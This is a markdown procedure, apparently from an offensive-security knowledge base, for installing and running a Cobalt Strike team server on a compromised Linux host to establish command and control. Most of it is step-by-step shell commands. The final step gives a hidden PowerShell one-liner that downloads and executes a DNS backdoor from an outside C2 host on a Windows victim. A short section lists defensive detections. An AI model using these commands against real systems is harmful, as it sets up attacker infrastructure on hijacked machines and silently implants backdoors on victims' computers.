---
type: procedure
description: >-
  Install and execute the Cobalt Strike Team Server on a compromised Linux
  system to establish command and control infrastructure.
verified: true
submitted: false
created_at: '2023-04-06T03:56:16.231861+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Command and Control]]'
  - '[[Defense Evasion]]'
  - '[[Persistence]]'
techniques:
  - '[[Data Encoding]]'
  - '[[Obfuscated Files or Information]]'
  - '[[Server Software Component]]'
  - '[[Standard Application Layer Protocol]]'
sub_techniques: []
tags:
  - cobalt-strike
  - c2
  - post-exploitation
  - linux
commands:
  - '[[commands/apt-update]]'
  - '[[commands/install-openjdk-11-jdk]]'
  - '[[commands/install-proxychains-and-socat]]'
  - '[[commands/set-java-alternatives-openjdk-11]]'
  - '[[commands/start-cobalt-strike-teamserver]]'
  - '[[commands/start-cobalt-strike-client]]'
  - '[[commands/download-and-execute-dnsback-payload]]'
platforms:
  - Linux
tools:
  - '[[tools/Cobalt-Strike]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Cobalt-Strike-Team-Server-Installation-and-Execution

## Summary

This procedure outlines the installation and execution of the Cobalt Strike Team Server on a compromised Linux system, enabling attackers to set up a command and control (C2) server for managing beacons and performing post-exploitation activities such as lateral movement, privilege escalation, and data exfiltration. It assumes root access on a Debian-based system and focuses on configuring Java dependencies, starting the team server, and launching the client for interaction.

## Description

Cobalt Strike is a commercial post-exploitation tool used by advanced threat actors to simulate adversary behaviors while evading detection and maintaining persistence in a network. The Team Server component runs on the compromised host, providing the backend C2 infrastructure, while the client allows the operator to issue commands to implanted beacons. This procedure targets Linux environments (e.g., Ubuntu/Debian) and includes setup of required Java runtime, proxy tools for evasion, and execution of the server with a configurable C2 profile. Once operational, the server listens for incoming beacons and supports malleable C2 profiles to blend traffic with legitimate protocols like HTTP/HTTPS. Prerequisites include physical or remote root access to the target and possession of the Cobalt Strike binaries (teamserver and client executables).

## Requirements

1. Root or sudo access on a Debian-based Linux system (e.g., Ubuntu).
2. Cobalt Strike license and downloaded binaries (teamserver executable and cobaltstrike client).
3. Network connectivity for the team server to bind to an IP (e.g., VPS or compromised host IP).
4. Optional: A malleable C2 profile file for traffic obfuscation.
5. Internet access for package installation.

## Defense

- Implement application whitelisting and runtime monitoring to block unauthorized Java executions and binary runs.
- Use network segmentation and EDR tools to detect anomalous outbound connections on non-standard ports or unusual HTTP patterns.
- Monitor for Java installations and updates on critical systems, and employ file integrity monitoring for system binaries.
- Deploy proxy logging and DNS sinkholing to identify C2 traffic; tools like Zeek or Suricata can signature-match Cobalt Strike beacons.

## Objectives

1. Install Java dependencies and supporting tools to run the Team Server.
2. Configure and start the Cobalt Strike Team Server for C2 operations.
3. Launch the client to interact with the server and deploy example payloads like DNSBack for persistence.
4. Establish persistent C2 access for further post-exploitation.

## Instructions

### Step 1: Update Package Repository

**Context**: Refresh the system's package index to ensure the latest versions of dependencies are available, reducing installation errors.

**Command** ([[commands/apt-update]]):
```bash
sudo apt-get update
```

> This command fetches the latest package lists from repositories. Run it first to avoid dependency resolution issues.

### Step 2: Install OpenJDK 11

**Context**: Cobalt Strike requires Java 11 for execution; install the JDK to provide the necessary runtime environment.

**Command** ([[commands/install-openjdk-11-jdk]]):
```bash
sudo apt-get install openjdk-11-jdk
```

> This installs the OpenJDK 11 development kit. Verify installation with `java -version` afterward.

### Step 3: Install Proxychains and Socat

**Context**: Proxychains enables SOCKS proxying for evading network restrictions, while Socat provides versatile networking utilities for port forwarding and redirection in C2 setups.

**Command** ([[commands/install-proxychains-and-socat]]):
```bash
sudo apt install proxychains socat
```

> These tools support advanced C2 configurations, such as chaining traffic through proxies. Configure `/etc/proxychains.conf` if needed for specific proxies.

### Step 4: Set Java Alternatives to OpenJDK 11

**Context**: Ensure the system defaults to Java 11, resolving any multi-Java version conflicts that could prevent Cobalt Strike from running.

**Command** ([[commands/set-java-alternatives-openjdk-11]]):
```bash
sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
```

> This sets OpenJDK 11 as the default Java version. Confirm with `update-java-alternatives --list`.

### Step 5: Start the Cobalt Strike Team Server

**Context**: Launch the team server, binding it to a specific IP and password-protecting it; include a malleable C2 profile for traffic obfuscation.

**Command** ([[commands/start-cobalt-strike-teamserver]]):
```bash
sudo ./teamserver $_TEAMSERVER_IP "$_PASSWORD" $_C2_PROFILE
```

> Replace placeholders with actual values (e.g., IP: 10.10.10.10, password: strongpass, profile: profile.cna). The server will run in the foreground; use nohup or screen for background operation. Expected: Server starts listening on the specified IP/port (default 50050).

### Step 6: Start the Cobalt Strike Client

**Context**: Connect the operator's client to the team server to manage sessions and deploy beacons.

**Command** ([[commands/start-cobalt-strike-client]]):
```bash
./cobaltstrike
```

> Run this on the operator's machine (or same host if local). It prompts for team server details (IP:port, user:pass). Expected: GUI client launches, connecting to the server.

### Step 7: Download and Execute DNSBack Payload (Example Beacon Deployment)

**Context**: As a test of C2 functionality, download and execute a DNS-based backdoor payload via PowerShell to simulate beacon implantation on a Windows target.

**Command** ([[commands/download-and-execute-dnsback-payload]]):
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"
```

> This downloads and executes a DNSBack script from a C2-controlled server, establishing a beacon. Use on a compromised Windows host connected to the team server. Expected: Silent execution with callback to the C2 server.
